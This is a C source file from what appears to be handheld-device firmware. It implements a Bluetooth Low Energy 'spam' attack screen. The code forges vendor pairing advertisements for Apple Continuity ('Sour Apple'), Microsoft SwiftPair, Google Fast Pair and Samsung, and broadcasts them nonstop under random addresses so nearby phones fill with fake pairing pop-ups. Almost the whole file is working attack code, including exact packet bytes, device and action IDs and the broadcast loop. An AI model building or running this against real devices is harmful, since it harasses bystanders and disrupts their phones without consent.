/*
 * MARAUDER - Bluetooth > Attacks > BLE spam, through api->ble->adv_raw (0.40).
 *
 * Forge the raw advertising packets each vendor's pairing pop-up keys on and
 * broadcast them under a fresh random address every time, so a phone nearby sees
 * a crowd of fake devices asking to pair - the BLE analog of the Wi-Fi beacon
 * spam.  The exact bytes are what make a given phone show a given pop-up; these
 * are the widely-documented forms, and which pop-ups appear is up to the phone.
 *
 * Kept in its own file (not mrd_bt.c) so the vendor packet builders and the
 * spam loop stand apart from the observer/skimmer screens; it carries its own
 * small string/UI helpers rather than reaching into another translation unit.
 *
 * Copyright (c) 2026 ArgonOS contributors.  SPDX-License-Identifier: GPL-3.0-or-later
 */
#include "mrd.h"
#include <argon/keys.h>

/* ---- small local helpers ------------------------------------------------- */

static char *sput(char *p, char *end, char c)
{
    if (p < end - 1) {
        *p++ = c;
    }
    return p;
}
static char *sput_uint(char *p, char *end, uint32_t v)
{
    char tmp[10];
    int  n = 0;
    do {
        tmp[n++] = (char)('0' + (v % 10u));
        v /= 10u;
    } while (v && n < (int)sizeof(tmp));
    while (n > 0) {
        p = sput(p, end, tmp[--n]);
    }
    return p;
}
static int spam_is_back_key(uint16_t kc)
{
    return kc == AG_KEY_ESC || kc == AG_KEY_LEFT || kc == AG_KEY_BACKSPACE;
}

static void spam_paint_msg(mrd_band_t *bd, void *ctx)
{
    const char **m = (const char **)ctx;
    const int    ty0 = mrd_text_y(0, MRD_STATUS_H, MRD_TITLE_SCALE);
    mrd_band_fill(bd, 0, 0, bd->w, MRD_STATUS_H, MRD_C_BAR_BG);
    mrd_band_fill(bd, 0, MRD_STATUS_H - 1, bd->w, 1, MRD_C_LGREY);
    int tx = 6 + mrd_band_text(bd, 6, ty0, "<", MRD_C_LGREY, 0xFFFFFFFFu,
                               MRD_TITLE_SCALE) + 4;
    mrd_band_text(bd, tx, ty0, m[0], MRD_C_RED, 0xFFFFFFFFu, MRD_TITLE_SCALE);
    mrd_band_text(bd, 8, MRD_STATUS_H + 20, m[1], MRD_C_YELLOW, 0xFFFFFFFFu, 1);
}

static void spam_wait_back(mrd_disp_t *d, const char *title, const char *msg)
{
    const char *m[2] = { title, msg };
    int         dirty = 1;
    for (;;) {
        if (dirty) {
            mrd_gfx_paint(d, MRD_C_BG, spam_paint_msg, m);
            dirty = 0;
        }
        ag_event_t ev;
        if (!ag_poll_event(&ev, 200)) {
            continue;
        }
        if (ev.type == AG_EV_QUIT) {
            return;
        }
        if (ev.type == AG_EV_FOCUS_GAINED) {
            dirty = 1;
        } else if (ev.type == AG_EV_KEY_DOWN) {
            return;
        } else if (ev.type == AG_EV_POINTER_DOWN) {
            int px, py;
            mrd_touch_to_px(d, ev.ptr.x, ev.ptr.y, &px, &py);
            if (py < MRD_STATUS_H) {
                return;
            }
        }
    }
}

/* ---- vendor packet builders ---------------------------------------------- */

enum { SPAM_APPLE = 0, SPAM_MS, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_ALL };

static uint32_t s_rng = 0x2545f491u;
static uint8_t  rnd8(void)
{
    s_rng = s_rng * 1664525u + 1013904223u;
    return (uint8_t)(s_rng >> 24);
}

/* Apple continuity nearby-action - the pop-ups a spoofed Apple device asks for
 * (Setup, Transfer, and the rest).  action rotates through the known types. */
static uint32_t build_apple(uint8_t *b)
{
    static const uint8_t acts[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d,
                                    0x2f, 0x01, 0x06, 0x20, 0x0b, 0x0d,
                                    0x13, 0x24 };
    const uint8_t act = acts[rnd8() % (uint8_t)sizeof(acts)];
    uint32_t n = 0;
    b[n++] = 0x02; b[n++] = 0x01; b[n++] = 0x1a; /* flags */
    b[n++] = 0x0a;                               /* AD len: 10 follow */
    b[n++] = 0xff; b[n++] = 0x4c; b[n++] = 0x00; /* mfg, Apple */
    b[n++] = 0x0f; b[n++] = 0x05;                /* nearby action, len 5 */
    b[n++] = 0xc1;                               /* action flags */
    b[n++] = act;
    b[n++] = rnd8(); b[n++] = rnd8(); b[n++] = rnd8();
    return n;
}

/* Microsoft SwiftPair - the Windows new-Bluetooth-device pop-up, with a name. */
static uint32_t build_ms(uint8_t *b)
{
    static const char *names[] = { "ArgonOS", "MARAUDER", "Free Airpods",
                                   "Not a virus" };
    const char *nm = names[rnd8() % 4u];
    uint8_t     nl = 0;
    while (nm[nl]) {
        nl++;
    }
    uint32_t n = 0;
    b[n++] = 0x02; b[n++] = 0x01; b[n++] = 0x06;   /* flags */
    b[n++] = (uint8_t)(6u + nl);                   /* AD len */
    b[n++] = 0xff; b[n++] = 0x06; b[n++] = 0x00;   /* mfg, Microsoft */
    b[n++] = 0x03; b[n++] = 0x00; b[n++] = 0x80;   /* SwiftPair pairing */
    for (uint8_t i = 0; i < nl; i++) {
        b[n++] = (uint8_t)nm[i];
    }
    return n;
}

/* Google Fast Pair - service data FE2C with a model id that pops a card. */
static uint32_t build_google(uint8_t *b)
{
    static const uint8_t models[][3] = {
        { 0xcd, 0x82, 0x56 }, { 0x00, 0x00, 0xf0 }, { 0x82, 0x1f, 0x66 },
        { 0x92, 0xbb, 0xbd }, { 0x47, 0x56, 0x78 },
    };
    const uint8_t *m = models[rnd8() % 5u];
    uint32_t       n = 0;
    b[n++] = 0x02; b[n++] = 0x01; b[n++] = 0x06;               /* flags */
    b[n++] = 0x03; b[n++] = 0x03; b[n++] = 0x2c; b[n++] = 0xfe; /* uuid FE2C */
    b[n++] = 0x06; b[n++] = 0x16; b[n++] = 0x2c; b[n++] = 0xfe; /* svc data */
    b[n++] = m[0]; b[n++] = m[1]; b[n++] = m[2];               /* model id */
    return n;
}

/* Samsung - a Galaxy buds/watch pair pop-up (best-effort documented form). */
static uint32_t build_samsung(uint8_t *b)
{
    static const uint8_t ids[] = { 0x01, 0x02, 0x03, 0x09, 0x0a, 0x0e };
    const uint8_t        id = ids[rnd8() % (uint8_t)sizeof(ids)];
    uint32_t             n = 0;
    b[n++] = 0x02; b[n++] = 0x01; b[n++] = 0x18;
    b[n++] = 0x1b; b[n++] = 0xff; b[n++] = 0x75; b[n++] = 0x00; /* mfg Samsung */
    b[n++] = 0x42; b[n++] = 0x09; b[n++] = 0x81; b[n++] = 0x02;
    b[n++] = 0x14; b[n++] = 0x15; b[n++] = 0x03; b[n++] = 0x21;
    b[n++] = 0x01; b[n++] = 0x09; b[n++] = id;   b[n++] = 0x06;
    b[n++] = 0x3c; b[n++] = 0x94; b[n++] = 0x8e; b[n++] = 0x00;
    b[n++] = 0x00; b[n++] = 0x00; b[n++] = 0x00; b[n++] = 0xc7;
    b[n++] = 0x00;
    return n;
}

static uint32_t build_vendor(int vendor, uint8_t *b)
{
    switch (vendor) {
    case SPAM_APPLE:   return build_apple(b);
    case SPAM_MS:      return build_ms(b);
    case SPAM_SAMSUNG: return build_samsung(b);
    default:           return build_google(b);
    }
}

static const char *vendor_name(int v)
{
    switch (v) {
    case SPAM_APPLE:   return "Apple";
    case SPAM_MS:      return "SwiftPair";
    case SPAM_SAMSUNG: return "Samsung";
    default:           return "Google";
    }
}

static int spam_mode_from_label(const char *l)
{
    if (l[0] == 'G') return SPAM_GOOGLE;                 /* Google Spam */
    if (l[0] == 'S' && l[1] == 'o') return SPAM_APPLE;   /* Sour Apple */
    if (l[0] == 'S' && l[1] == 'w') return SPAM_MS;      /* SwiftPair Spam */
    if (l[0] == 'S' && l[1] == 'a') return SPAM_SAMSUNG; /* Samsung Spam */
    return SPAM_ALL;                                     /* Spam All */
}

typedef struct {
    int         W, H;
    const char *title;
    uint32_t    sent;
    int         cur;
} mrd_spam_t;

static void paint_spam(mrd_band_t *bd, void *ctx)
{
    mrd_spam_t *s = (mrd_spam_t *)ctx;
    char        buf[24];
    char       *e = buf + sizeof(buf);
    const int   ty0 = mrd_text_y(0, MRD_STATUS_H, MRD_TITLE_SCALE);

    mrd_band_fill(bd, 0, 0, s->W, MRD_STATUS_H, MRD_C_BAR_BG);
    mrd_band_fill(bd, 0, MRD_STATUS_H - 1, s->W, 1, MRD_C_LGREY);
    int tx = 6 + mrd_band_text(bd, 6, ty0, "<", MRD_C_LGREY, 0xFFFFFFFFu,
                               MRD_TITLE_SCALE) + 4;
    mrd_band_text(bd, tx, ty0, s->title, MRD_C_RED, 0xFFFFFFFFu,
                  MRD_TITLE_SCALE);

    int   y = MRD_STATUS_H + 10;
    char *p = sput_uint(buf, e, s->sent);
    *p = '\0';
    mrd_band_text(bd, 12, y + 6, "sent", MRD_C_LGREY, 0xFFFFFFFFu, 1);
    mrd_band_text(bd, s->W - mrd_text_w(buf, 2) - 14, y, buf, MRD_C_RED,
                  0xFFFFFFFFu, 2);
    y += 44;

    mrd_band_text(bd, 12, y, "broadcasting:", MRD_C_LGREY, 0xFFFFFFFFu, 1);
    mrd_band_text(bd, 130, y, vendor_name(s->cur), MRD_C_WHITE, 0xFFFFFFFFu, 1);
    y += 26;
    mrd_band_text(bd, 12, y, "point at a phone to see the", MRD_C_LGREY,
                  0xFFFFFFFFu, 1);
    y += 16;
    mrd_band_text(bd, 12, y, "pairing pop-ups.  Back stops.", MRD_C_LGREY,
                  0xFFFFFFFFu, 1);
}

void mrd_screen_bt_spam(mrd_disp_t *d, const char *label)
{
    const int mode = spam_mode_from_label(label);
    if (!ag_ble_available() || !AG_HAS(ag_api()->ble, adv_raw)) {
        spam_wait_back(d, label, "no raw BLE adv in this build");
        return;
    }

    mrd_spam_t s;
    memset(&s, 0, sizeof(s));
    s.W = d->W;
    s.H = d->H;
    s.title = label;
    s.cur = (mode == SPAM_ALL) ? SPAM_APPLE : mode;
    s_rng ^= ag_millis();

    uint8_t  frame[31];
    uint8_t  mac[6];
    for (int k = 0; k < 6; k++) {
        mac[k] = rnd8();
    }
    uint32_t       len = build_vendor(s.cur, frame);
    const ag_err_t first = ag_ble_adv_raw(mac, frame, len);
    if (first != AG_OK) {
        ag_printf("[mrd] bt spam adv_raw: err=%d\n", (int)first);
        spam_wait_back(d, label,
                       first == -AG_ENOMEM
                           ? "no radio: run 'bt on' first, then reopen"
                           : "could not advertise");
        return;
    }
    s.sent++;

    uint32_t last_paint = 0;
    int      running = 1;

    while (running) {
        if (mode == SPAM_ALL) {
            s.cur = (int)(s.sent % 4u);
        }
        for (int k = 0; k < 6; k++) {
            mac[k] = rnd8();
        }
        len = build_vendor(s.cur, frame);
        if (ag_ble_adv_raw(mac, frame, len) == AG_OK) {
            s.sent++;
        }

        ag_event_t ev;
        while (ag_poll_event(&ev, 0)) {
            if (ev.type == AG_EV_QUIT) {
                running = 0;
                break;
            }
            if (ev.type == AG_EV_FOCUS_GAINED) {
                last_paint = 0;
            } else if (ev.type == AG_EV_KEY_DOWN) {
                if (spam_is_back_key(ev.key.keycode)) {
                    running = 0;
                }
            } else if (ev.type == AG_EV_POINTER_DOWN) {
                int px, py;
                mrd_touch_to_px(d, ev.ptr.x, ev.ptr.y, &px, &py);
                if (py < MRD_STATUS_H) {
                    running = 0;
                }
            }
        }

        const uint32_t now = ag_millis();
        if (running && now - last_paint >= 300u) {
            mrd_gfx_paint(d, MRD_C_BG, paint_spam, &s);
            ag_printf("[mrd] bt spam sent=%u vendor=%s\n", s.sent,
                      vendor_name(s.cur));
            last_paint = now;
        }
        ag_heartbeat();
        ag_delay(40);
    }

    (void)ag_ble_adv_stop();
    ag_printf("[mrd] bt spam stopped, sent=%u\n", s.sent);
}
